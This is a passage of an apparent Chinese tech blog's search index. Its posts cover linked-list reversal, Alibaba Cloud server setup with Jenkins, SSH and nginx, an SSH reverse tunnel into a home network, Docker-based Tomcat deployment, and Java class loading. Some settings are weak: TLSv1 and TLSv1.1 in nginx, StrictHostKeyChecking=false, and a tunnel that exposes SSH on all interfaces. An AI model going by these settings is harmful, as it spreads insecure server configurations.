class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Solution</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">reverseList</span>(<span class=\"params\">self, head</span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        :type head: ListNode</span></span><br><span class=\"line\"><span class=\"string\">        :rtype: ListNode</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        prev = <span class=\"literal\">None</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> head:</span><br><span class=\"line\">            curr = head</span><br><span class=\"line\">            head = head.<span class=\"built_in\">next</span></span><br><span class=\"line\">            curr.<span class=\"built_in\">next</span> = prev</span><br><span class=\"line\">            prev = curr</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> prev</span><br></pre></td></tr></table></figure>","categories":["算法"],"tags":["链表","链表翻转"]},{"title":"记一次阿里云环境搭建","url":"/2018/04/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%98%BF%E9%87%8C%E4%BA%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"<p>在阿里云上现在购买esc好像默认是专有网络，以前使用的是经典网络。如果现在有两台服务器分别不在同一个账号上，那么需要配置高速通道。不过还好的是对于同一个地区高速通道并不要钱。</p>\n<p>在其中一台服务器上部署测试环境，同时搭建jenkins用来自动化打包和发布。</p>\n<p>先安装JDK、Tomcat、Nginx，不会有什么问题。</p>\n<span id=\"more\"></span>\n<h3 id=\"Tomcat根目录启动\"><a href=\"#Tomcat根目录启动\" class=\"headerlink\" title=\"Tomcat根目录启动\"></a>Tomcat根目录启动</h3><p>下载Tomcat解压后删除<code>webapps</code>目录下所有文件。<br>修改<code>conf/server.xml</code>文件，在Host节点下添加<code>&lt;Context path=&quot;&quot; reloadable=&quot;true&quot; docBase=&quot;/home/xxxx/xxx.war&quot; /&gt;</code>，用于指定war路径，启动tomcat后，直接访问就是在根目录。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lha29vNS9hcnRpY2xlL2RldGFpbHMvNTMyMDc4ODA=\">将Web应用部署到Tomcat根目录的三种方法<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<h3 id=\"防火墙设置\"><a href=\"#防火墙设置\" class=\"headerlink\" title=\"防火墙设置\"></a>防火墙设置</h3><p>在默认情况下阿里云是屏蔽了端口的访问，所以需要在阿里云–&gt;安全组规则中配置开放端口，常用的端口有443、22、23、3306、80端口。</p>\n<p>默认情况下，阿里云使用使用centos7镜像是关闭了防火墙。</p>\n<p>启动防火墙，同时设置为开机启动</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#centos7启动防火墙</span></span><br><span class=\"line\">systemctl start firewalld.service</span><br><span class=\"line\"><span class=\"comment\">#centos7停止防火墙/关闭防火墙</span></span><br><span class=\"line\">systemctl stop firewalld.service</span><br><span class=\"line\"><span class=\"comment\">#centos7重启防火墙</span></span><br><span class=\"line\">systemctl restart firewalld.service</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#设置开机启用防火墙</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> firewalld.service</span><br><span class=\"line\"><span class=\"comment\">#设置开机不启动防火墙</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> firewalld.service</span><br></pre></td></tr></table></figure>\n<p>如果开启了防火墙，那么除了在阿里云安全组规则中配置开放端口，本机的防火墙也需要配置端口开启</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class=\"line\"><span class=\"comment\">#说明:</span></span><br><span class=\"line\"><span class=\"comment\">#–zone #作用域</span></span><br><span class=\"line\"><span class=\"comment\">#–add-port=80/tcp #添加端口，格式为：端口/通讯协议</span></span><br><span class=\"line\"><span class=\"comment\">#–permanent 永久生效，没有此参数重启后失效</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#多个端口:</span></span><br><span class=\"line\">firewall-cmd --zone=public --add-port=80-90/tcp --permanent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除端口</span></span><br><span class=\"line\">firewall-cmd --zone=public --remove-port=80/tcp --permanent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#centos7查看防火墙所有信息</span></span><br><span class=\"line\">firewall-cmd --list-all</span><br><span class=\"line\"><span class=\"comment\">#centos7查看防火墙开放的端口信息</span></span><br><span class=\"line\">firewall-cmd --list-ports</span><br><span class=\"line\"><span class=\"comment\">#centos7以下使用netstat -ant,7使用ss</span></span><br><span class=\"line\">ss -ant</span><br></pre></td></tr></table></figure>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sZWZ0c28uY29tL2Jsb2cvMTYzLmh0bWw=\">centos 7 firewall(防火墙)开放端口&#x2F;删除端口&#x2F;查看端口 <i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<h3 id=\"jenkins部署\"><a href=\"#jenkins部署\" class=\"headerlink\" title=\"jenkins部署\"></a>jenkins部署</h3><p>jenkins直接下载war启动，之后依据提示走流程。<br>在使用jenkins部署项目时，在项目打包完成后，需要重启服务器，因为jenkins和目标服务器不在同一服务器上，所以需要使用jenkins远程执行命令。</p>\n<h4 id=\"无密码访问\"><a href=\"#无密码访问\" class=\"headerlink\" title=\"无密码访问\"></a>无密码访问</h4><p>其实直接使用jenkins中ssh插件就可以远程执行命令，这里使用的是ssh免密码。<br>在jenkins服务器上执行命令<code>ssh-keygen -t  rsa</code>生成密钥和公钥，把生成的<code>id_rsa.pub</code>上传到目标服务器<code>~/.ssh/authorized_keys</code>文件中，如果文件不存在，直接新建文件，如果文件存在，直接添加到文件末尾。<br>或者通过命令<code>ssh-copy-id -i ~/.ssh/id_rsa.pub user@192.168.0.1</code>上传到目标服务器。</p>\n<p>设置<code>authorized_keys</code>文件权限<code>chmod 644 authorized_keys</code><br>设置<code>.ssh</code>目录权限<code>chmod 700 -R .ssh</code></p>\n<p>这样就可以无密码访问远程服务器。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3podXlpbmdfbGludXgvYXJ0aWNsZS9kZXRhaWxzLzcwNDkwNzhCYzRSQGYxSWQ1USE=\">linux远程登录ssh免密码<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>在使用jenkins时，因为设置了无密码访问，所有可以通过scp直接上传war包，之后通过ssh执行远程命令。</p>\n<h4 id=\"ssh远程执行\"><a href=\"#ssh远程执行\" class=\"headerlink\" title=\"ssh远程执行\"></a>ssh远程执行</h4><p>在使用ssh远程执行命令时，缺少环境变量。<br>解决办法是在执行远程shell时，<code>source ~/.bash_profile</code>，因为之前JDK之类的环境变量是在<code>.bash_profile</code>文件中，所以先刷新环境变量，之后在执行相关的命令。</p>\n<h3 id=\"tomcat重启\"><a href=\"#tomcat重启\" class=\"headerlink\" title=\"tomcat重启\"></a>tomcat重启</h3><p>在部署项目时，需要对tomcat进行重启，使用如下脚本执行：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> BUILD_ID=dontkillme\t<span class=\"comment\">#避免启动时被jenkins杀掉</span></span><br><span class=\"line\">/home/xxxx/apache-tomcat-9.0.7/bin/./shutdown.sh</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 3</span><br><span class=\"line\">tomcat_process=`ps aufx|grep tomcat | grep manage | awk <span class=\"string\">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -n <span class=\"string\">&quot;<span class=\"variable\">$tomcat_process</span>&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">kill</span> -9 <span class=\"variable\">$tomcat_process</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;kill tomcat&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"comment\">#`ps aufx|grep tomcat | grep manage | awk &#x27;&#123;print $2&#125;&#x27; |xargs kill -9`</span></span><br><span class=\"line\"><span class=\"comment\">#ps axuf|grep tomcat|grep -v grep |grep manage|awk &#x27;&#123;print &quot;kill -9 &quot; $2&#125;&#x27;|sh</span></span><br><span class=\"line\">/home/xxxx/apache-tomcat-9.0.7/bin/./startup.sh</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"tomcat序列化\"><a href=\"#tomcat序列化\" class=\"headerlink\" title=\"tomcat序列化\"></a>tomcat序列化</h4><p>在之前测试和使用tomcat时，都是直接<code>kill</code>tomcat进程然后重启tomcat，现在是通过tomcat命令重启。<br>在tomcat关闭时，会把<code>session</code>中的对象序列化放入<code>work</code>目录中<code>session.ser</code>文件，在重启tomcat时，会把对象重新反序列化到<code>session</code>中，又因为在项目中对象的一些基本属性是放入了一个公用的父类里面，子类继承时，虽然子类实现了序列化接口，但是在使用Java序列化时，如果父类没有实现序列化接口，反序列化时，并不会反序列化父类，所以这里因为父类没实现导致反序列化时丢失部分属性，导致使用到父类属性的功能失效。</p>\n<h3 id=\"验证码乱码\"><a href=\"#验证码乱码\" class=\"headerlink\" title=\"验证码乱码\"></a>验证码乱码</h3><p>在项目部署后，有个验证码功能，在使用验证码时，发现返回的验证码乱码无法识别，这是因为使用验证码时使用的字体在服务器上没有，导致验证码乱码。解决办法：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install fontconfig-devel </span><br><span class=\"line\">yum groupinstall fonts</span><br></pre></td></tr></table></figure>\n<p>如上安装字体。</p>\n<h3 id=\"tomcat启动慢\"><a href=\"#tomcat启动慢\" class=\"headerlink\" title=\"tomcat启动慢\"></a>tomcat启动慢</h3><p>在使用过程中，tomcat每次启动特别慢，网络上说是因为一个tomcat在生成随机数导致系统变慢。解决办法：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install rng-tools</span><br><span class=\"line\">systemctl start rngd</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"nginx配置\"><a href=\"#nginx配置\" class=\"headerlink\" title=\"nginx配置\"></a>nginx配置</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server&#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name www.xxxx.com;</span><br><span class=\"line\">    # 强制转跳https</span><br><span class=\"line\">    return 301 https://$server_name$request_uri;</span><br><span class=\"line\">    #error_page 497 https://$host$uri?$args;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    # 强制添加www</span><br><span class=\"line\">    server_name xxxx.com;</span><br><span class=\"line\">    return 301 https://www.xxxx.com;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 设置https</span><br><span class=\"line\">server&#123;</span><br><span class=\"line\">    listen 443 ssl;</span><br><span class=\"line\">    server_name www.xxx.com;</span><br><span class=\"line\">    ssl on;</span><br><span class=\"line\">    ssl_certificate   cert/214591366330598.pem;</span><br><span class=\"line\">    ssl_certificate_key  cert/214591366330598.key;</span><br><span class=\"line\">    ssl_session_timeout 5m;</span><br><span class=\"line\">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;</span><br><span class=\"line\">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://localhost:8080;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header  X-Real-IP  $remote_addr;</span><br><span class=\"line\">        proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto  $scheme;</span><br><span class=\"line\">        proxy_redirect default;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"阿里云高速通道\"><a href=\"#阿里云高速通道\" class=\"headerlink\" title=\"阿里云高速通道\"></a>阿里云高速通道</h3><p>在使用jenkins发布war包时，如果走外网，那么因为带宽的原因，导致传输速度特别慢，所以需要使用阿里云高速通道。<br>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZWxwY2RuLmFsaXl1bi5jb20vZG9jdW1lbnRfZGV0YWlsLzQ0ODQzLmh0bWw/c3BtPWEyYzRnLjExMTg2NjIzLjIuMy5EcE5xTTQ=\">跨账号VPC互连<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<h3 id=\"数据库迁移\"><a href=\"#数据库迁移\" class=\"headerlink\" title=\"数据库迁移\"></a>数据库迁移</h3><p>在迁移数据时为了方便，直接拷贝原有数据库文件到新mysql中。<br>但是在使用过程中发现提示找不到table。<br>因为之前数据库中使用的<code>InnoDB</code>引擎，还需要拷贝<code>ibdata1</code>文件，暂停mysql后，删除现在<code>ib_logfile*</code>文件，重启mysql</p>\n<p>参考：</p>\n<ul>\n<li>[Mysql table ‘’ doesn&#96;t exist](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9icnVjZXh1eWcvYXJjaGl2ZS8yMDEyLzA2LzIyLzI1NTg3NTUuaHRtbA==\">http://www.cnblogs.com/brucexuyg/archive/2012/06/22/2558755.html<i class=\"fa fa-external-link-alt\"></i></span>)</li>\n</ul>\n<h3 id=\"其他命令\"><a href=\"#其他命令\" class=\"headerlink\" title=\"其他命令\"></a>其他命令</h3><p>打war包<br><code>jar -cvf test.war *</code></p>\n<p>解压war包<br><code>jar xvf temp.war</code></p>\n","tags":["阿里云","VPC互通","jenkins"]},{"title":"ssh反向代理连接内网","url":"/2018/04/19/ssh%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91/","content":"<p>因为在家有个笔记本装的ubuntu，需要在公司访问家里笔记本，家中的宽带没有内网IP，所以需要通过反向代理访问家中电脑，需要一台外网服务器作为中转，使用的是阿里云做为中转服务器。</p>\n<p>| 机器 | 描述 |<br>| : –| : –|<br>| 家ubuntu | 内网 |<br>| 阿里云 | 独立IP |<br>| 公司 | 内网 |</p>\n<p>1、先通过家里机器反向代理到阿里云<br>2、阿里云提供正向代理，通过公司访问</p>\n<span id=\"more\"></span>\n\n<p>反向代理<code>ssh -fCNR</code><br>正向代理<code>ssh -fCNL</code></p>\n<blockquote>\n<p>-f 后台执行ssh指令<br>-C 允许压缩数据<br>-N 不执行远程指令<br>-R 将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口<br>-L 将本地机(客户机)的某个端口转发到远端指定机器的指定端口<br>-p 指定远程主机的端口</p>\n</blockquote>\n<p>在家中电脑执行：<br><code>ssh -fnNT -R 6666:localhost:22 aliyun@xxx.xx.xx.xx</code></p>\n<blockquote>\n<p>上述中6666表示阿里云监听的本地端口</p>\n</blockquote>\n<p>登陆阿里云，<code>ssh -p6666 homeuser@localhost</code>即可登陆家中服务器。</p>\n<p>现在需要进一步使用正向代理，方便公司通过代理访问。</p>\n<p>在阿里云上执行<br><code>ssh -fCNL *:7777:localhost:6666 localhost</code></p>\n<blockquote>\n<p>上述6666表示之前分析代理监听的端口，7777表示正向代理的端口</p>\n</blockquote>\n<p>在公司使用<code>ssh -p7777 homeuser@xxx.xx.xx.xx</code>即可登陆家中电脑。</p>\n<p>因为ssh可能会出现超时端口，所以在家中启动的反向代理使用autossh，如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">autossh -M 6667 \\</span><br><span class=\"line\">-fN -o <span class=\"string\">&quot;PubkeyAuthentication=yes&quot;</span> \\</span><br><span class=\"line\">-o <span class=\"string\">&quot;StrictHostKeyChecking=false&quot;</span> -o <span class=\"string\">&quot;ServerAliveInterval 60&quot;</span> -o <span class=\"string\">&quot;ServerAliveCountMax 3&quot;</span> \\</span><br><span class=\"line\">-R 6666:localhost:22 aliyun@xxx.xx.xx.xx</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>6667 用于重连</p>\n</blockquote>\n<p>端口监听命令：<br>netstat -tunlp</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va3dvbmd0YWkvcC82OTAzNDIwLmh0bWw=\">利用ssh反向代理以及autossh实现从外网连接内网服务器<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sdmlpLmdpdGh1Yi5pby9zeXN0ZW0vMjAxMy8xMC8wOC9zc2gtcmVtb3RlLXBvcnQtZm9yd2FyZGluZy8=\">SSH 远程端口转发<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["ssh"],"tags":["ssh","反向代理","内网穿透"]},{"title":"docker部署项目","url":"/2018/04/23/docker%E9%83%A8%E7%BD%B2%E9%A1%B9%E7%9B%AE/","content":"<p>在部署项目时，每次需要配置不同的环境，如tomcat，jdk等等，过于麻烦，如果直接使用docker做好镜像后，启动docker容器即可方便启动项目。</p>\n<h3 id=\"docker配置tomcat\"><a href=\"#docker配置tomcat\" class=\"headerlink\" title=\"docker配置tomcat\"></a>docker配置tomcat</h3><p>下载jdk、tomcat解压放到本地。<br>编写Dockerfile。</p>\n<span id=\"more\"></span>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 使用centos作为基础镜像</span></span><br><span class=\"line\"><span class=\"keyword\">FROM</span> centos</span><br><span class=\"line\"><span class=\"comment\"># 复制本地jkd、tomcat到镜像目录</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./jdk8 /usr/local/share/jdk8</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./tomcat9 /usr/local/share/tomcat9</span></span><br><span class=\"line\"><span class=\"comment\"># 配置运行时环境变量</span></span><br><span class=\"line\"><span class=\"keyword\">ENV</span> JAVA_HOME /usr/local/share/jdk8</span><br><span class=\"line\"><span class=\"keyword\">ENV</span> PAHT $JAVA_HOME/bin:$PATH</span><br><span class=\"line\"><span class=\"comment\"># 声明端口</span></span><br><span class=\"line\"><span class=\"keyword\">EXPOSE</span> <span class=\"number\">8080</span></span><br><span class=\"line\"><span class=\"comment\"># 启动tomcat，同时使用tail-f是因为了避免 docker自动执行完shell后直接停止</span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> /usr/local/share/tomcat9/bin/startup.sh &amp;&amp; <span class=\"built_in\">tail</span> -F /usr/local/share/tomcat9/logs/catalina.out</span></span><br></pre></td></tr></table></figure>\n<p>上述就简单的配置生成镜像<br>命令<code>docker build -t tomcatweb --rm=true .</code>生成镜像。</p>\n<blockquote>\n<p>-t：用于生成镜像名<br>–rm：指定在生成镜像过程中删除中间产生的临时容器<br>.：表示当前目录下的Dockerfile</p>\n</blockquote>\n<p>之后通过<code>docker images</code>查看生成的镜像。</p>\n<p>启动镜像<code>docker run -d -p 8080:8080 tomcatweb</code>，之后会生成一个运行中的容器，通过命令<code>docker ps</code>可查看容器。</p>\n<blockquote>\n<p>-d：生成的容器后台运行<br>-p：表示本机8080端口与容器8080端口进行绑定，方便访问</p>\n</blockquote>\n<p>容器其他操作：</p>\n<blockquote>\n<p>docker ps -a：查看所有容器，包括停止的容器<br>docker stop [CONTAINER ID]：表示停止容器<br>docker start [CONTAINER ID]：启动容器<br>docker kill [CONTAINER ID]：直接杀死容器<br>docker rm [CONTAINER ID]：删除容器<br>docker rm $(docker ps -a -q)：删除本机所有容器</p>\n</blockquote>\n<p>启动后，通过<code>curl localhost:8080</code>可查看到tomcat已经启动完成，也可以直接浏览器访问</p>\n<h3 id=\"docker-compose集成启动项目\"><a href=\"#docker-compose集成启动项目\" class=\"headerlink\" title=\"docker-compose集成启动项目\"></a>docker-compose集成启动项目</h3><p>现在公司的项目一般是直接运行在tomcat根目录下，一个项目一个tomcat。<br>所以需要删除tomcat解压后webapps下所有文件。<br>重新运行之前命令生成新的镜像。<br>编写docker-compost.yml文件</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 这里不能为1，会出错</span></span><br><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;2&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 启动的服务</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">web:</span></span><br><span class=\"line\">    <span class=\"comment\"># 使用镜像</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">tomcatweb</span></span><br><span class=\"line\">    <span class=\"comment\">#使用的端口</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;8080:8080&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 挂载目录，在使用本地目录挂载到容器中时，本地目录需要使用绝对路径，相对路径可能会报错</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"comment\"># 用于存放配置文件，因为在项目启动时，配置文件是外放，并不放在war包中，</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/home/xxx/Documents/dockerstd/webroot/:/home/xxx/webroot</span></span><br><span class=\"line\">      <span class=\"comment\"># 日志文件，用于容器销毁后，日志文件还是保留在本地，因为容器中的数据会随着容器的销毁而销毁</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/home/xxx/Documents/dockerstd/logs/:/usr/local/share/tomcat9/logs</span></span><br><span class=\"line\">      <span class=\"comment\"># 用于项目在tomcat根目录启动</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/home/xxx/Documents/dockerstd/ROOT.xml:/usr/local/share/tomcat9/conf/Catalina/localhost/ROOT.xml</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>如果需要设置启动时JVM的参数，可以添加：environment: - JVM_OPTS&#x3D;-Xmx12g -Xms12g -XX:MaxPermSize&#x3D;1024m 用于配置jvm的参数。</li>\n</ul>\n<p>ROOT.xml如下，tomcat启动后，部署的项目处于tomcat根目录</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Context</span> <span class=\"attr\">path</span>=<span class=\"string\">&quot;&quot;</span> <span class=\"attr\">docBase</span>=<span class=\"string\">&quot;/home/xxxx/webroot/manage.war&quot;</span> <span class=\"attr\">reloadable</span>=<span class=\"string\">&quot;true&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">Context</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>启动容器<code>docker-compose up -d</code>，通过在本地logs目录下可以查看容器启动的日志。<br>也可以通过<code>docker logs -f [CONTAINER ID]</code>查看容器的日志。</p>\n<p>在启动容器后，如果需要进入容器，可以使用<code>docker exec -it [CONTAINER ID] bash</code>进入容器，这样可以用于排除项目启动以及生成的容器是否有问题。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RvY3MuZG9ja2VyLWNuLmNvbS9nZXQtc3RhcnRlZC8=\">docker官方文档<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI0NTU3ODI3L2FydGljbGUvZGV0YWlscy83MzcyOTkxMw==\">docker之使用dockerfile配置tomcat、jdk环境<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAwNzI3MTcyOA==\">指定jvm参数<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["docker"],"tags":["docker","部署","tomcat"]},{"title":"Java基础-类加载","url":"/2018/04/24/Java%E5%9F%BA%E7%A1%80-%E7%B1%BB%E5%8A%A0%E8%BD%BD/","content":"<p>在编译Java文件生成Class文件最终都需要加载到虚拟机中才能使用。虚拟机把Class文件加载到内存，并对数据进行校验、转换解析、初始化，最终形成可以被虚拟机直接使用的Java类型。</p>\n<p>类从被加载到卸载，生命周期如下：<br>加载 —&gt; 验证 —&gt; 准备 —&gt; 解析 —&gt; 初始化 —&gt; 使用 —&gt; 卸载</p>\n<p>其中验证、准备、解析三个节点称为连接。</p>\n<ul>\n<li>加载：找到Class加载到内存中，生成一个代表改类的Class对象（不同的虚拟机实现可不一样）。</li>\n<li>验证：校验Class中字节流符合当前虚拟机要求，主要包括文件格式验证、元数据验证、字节码验证、符号引用验证（NoSuchFieldError，NoSuchMethodError）。</li>\n<li>准备：为类变量分配内存初始化变量的初始值（只是赋值初始值，并不是赋值准确的值，如static a&#x3D;1，此处static&#x3D;0，之后初始化在设置static&#x3D;1）此处不包含final修饰的static，因为final修饰的static在编译时就会分配。</li>\n<li>解析：主要将常量池中符号引用（用于描述所引用的目标，目标不一定已经加载到内存中）替换为直接引用的过程。虚拟机要求在执行anewarray、checkcast、getfield、getstatic、instanceof、invokeinterface、invokespecial、invokestatic、invokevirtual、multianewarray、new、putfield、putstatic这13操作符之前对所使用的符号引用进行解析即可。</li>\n<li>初始化：类加载最后阶段，如果类具有父类，向上初始化，执行静态代码块已经初始化静态属性。</li>\n</ul>\n<p>上述中加载、验证、准备、初始化、卸载是确定的顺序，解析并不一定在上述所在的顺序，在有些情况下，解析可以在初始化之后，这是为了支持Java运行时绑定。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"类加载器\"><a href=\"#类加载器\" class=\"headerlink\" title=\"类加载器\"></a>类加载器</h3><p>类加载器只是用来实现类的加载动作，其他的验证、准备、解析、初始化都是有虚拟机内部完成。<br>自定义类加载器如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span><br><span class=\"line\">    String name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span><span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">classLoader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassLoader</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> Class&lt;?&gt; loadClass(String name) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> name.substring(name.lastIndexOf(<span class=\"string\">&quot;.&quot;</span>) + <span class=\"number\">1</span>) + <span class=\"string\">&quot;.class&quot;</span>;</span><br><span class=\"line\">                <span class=\"type\">InputStream</span> <span class=\"variable\">in</span> <span class=\"operator\">=</span> getClass().getResourceAsStream(fileName);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (in == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.loadClass(name);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"type\">byte</span>[] bytes = <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[in.available()];</span><br><span class=\"line\">                    in.read(bytes);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> defineClass(name, bytes, <span class=\"number\">0</span>, bytes.length);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.loadClass(name);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class=\"string\">&quot;com.whh.netty.Person&quot;</span>);</span><br><span class=\"line\">        System.out.println(clazz);<span class=\"comment\">//com.whh.netty.Person</span></span><br><span class=\"line\">        System.out.println(clazz == Person.class);<span class=\"comment\">//false</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;clazz class loader: %s\\n&quot;</span>, clazz.getClassLoader());<span 